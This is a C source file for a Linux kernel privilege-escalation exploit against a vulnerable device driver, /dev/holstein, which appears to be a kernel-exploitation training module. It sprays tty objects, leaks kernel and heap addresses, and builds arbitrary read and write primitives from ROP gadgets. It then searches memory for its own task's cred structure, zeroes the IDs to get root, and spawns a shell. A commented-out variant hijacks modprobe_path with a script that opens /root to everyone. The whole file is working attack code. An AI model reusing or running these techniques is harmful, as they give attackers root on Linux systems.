#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


#define DEV_PATH "/dev/hoge"
#define ulong unsigned long
#define scu static const unsigned long
//#define NULL (void*)0
#define offset_tty_ops 0xc38880
#define rop_mov_eax_prdx (kbase + 0x18a285)
#define rop_mov_prdx_rcx (kbase + 0x0477f7)
#define modprobe_str_addr (kbase + 0xe38180)

int spray[100];
int fd;
int cache_fd = -1;
char buf[0x500];
ulong kbase;
ulong g_buf;
ulong user_cs,user_ss,user_sp,user_rflags;

/*
void root_shell(void) {
  puts("[+] making evil script");
  system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
  system("chmod +x /tmp/evil.sh");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  puts("[+] spawn the root shell...");
  system("/tmp/pwn");
}
*/

void fatal(char msg[]) {
  printf("[!] Err: %s\n", msg);
  exit(-1);
}

// primitive Any Address Read (32bit)
unsigned int AAR32(unsigned long addr) {
  if (cache_fd == -1) {
    ulong *p = (ulong*)&buf;
    p[12] = rop_mov_eax_prdx;
    *(ulong*)&buf[0x418] = g_buf;
    write(fd, buf, 0x420);
  }
  // mov eax, [rdx]; ret;
  if (cache_fd == -1) {
    for (int i=0; i < 100; i++) {
      int v = ioctl(spray[i], 0, addr /* rdx */);
      if (v != -1) {
        cache_fd = spray[i];
        return v;
      }
    }
  } else {
    return ioctl(cache_fd, 0, addr /* rdx */);
  }
}

// primitive Any Address Write (32bit)
void AAW32(ulong addr, unsigned int val) {
  ulong *p = (ulong*)&buf;
  p[12] = rop_mov_prdx_rcx;
  *(unsigned long*)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);
  // mov [rdx], rcx; ret;
  for (int i=0; i < 100; i++) {
    ioctl(spray[i], val /* rcx */, addr /* rdx */);
  }
}

int main() {
  // heap spray
  for (int i=0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  fd = open("/dev/holstein", O_RDWR);
  if(fd == -1)
    fatal("/dev/holstein");

  for (int i=50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // kernel address leak
  read(fd, buf, 0x500);
  ulong leak = *(ulong*)&buf[0x418];
  printf("[i] tty_struct ops leak: 0x%016lx\n", leak);
  kbase = leak - offset_tty_ops;
  printf("[i] kernel base: 0x%016lx\n", kbase);
  // kernel heap address leak
  g_buf = *(ulong*)&buf[0x438] - 0x438;
  printf("[i] g_buf: 0x%016lx\n", g_buf);
  // overwrite modprobe_path
  /*
  printf("[i] modprobe str: 0x%016lx\n", modprobe_str_addr);
  char cmd[] = "/tmp/evil.sh";
  puts("[+] overwrite modprobe_path");
  for (int i = 0; i < sizeof(cmd); i += 4) {
    AAW32(modprobe_str_addr + i, *(unsigned int*)&cmd[i]);
  }
  */
  // search task_struct comm for get cred struct ptr
  if (prctl(PR_SET_NAME, "greentea") != 0)
    fatal("prctl");
  puts("[+] searching task_struct comm");
  ulong addr;
  for (addr = g_buf - 0x1000000; ; addr += 0x8) {
    if ((addr & 0xfffff) == 0)
      printf("[-] searching... 0x%016lx\n", addr);
    //// search "greentea"
    if (AAR32(addr) == 0x65657267
        && AAR32(addr+4) == 0x6165746e) {
      printf("[i] comm: 0x%016lx\n", addr);
      break;
    }
  }
  // overwrite cred
  ulong addr_cred = 0;
  addr_cred |= AAR32(addr - 8);
  addr_cred |= (ulong)AAR32(addr - 4) << 32;
  printf("[i] current->cred = 0x%016lx\n", addr_cred);
  puts("[+] overwrite cred to root");
  for (int i = 1; i < 9; i++) {
    AAW32(addr_cred + i*4, 0); // id=0(root)
  }
  puts("[+] spawn root shell...");
  system("/bin/sh");

  return 0;
}
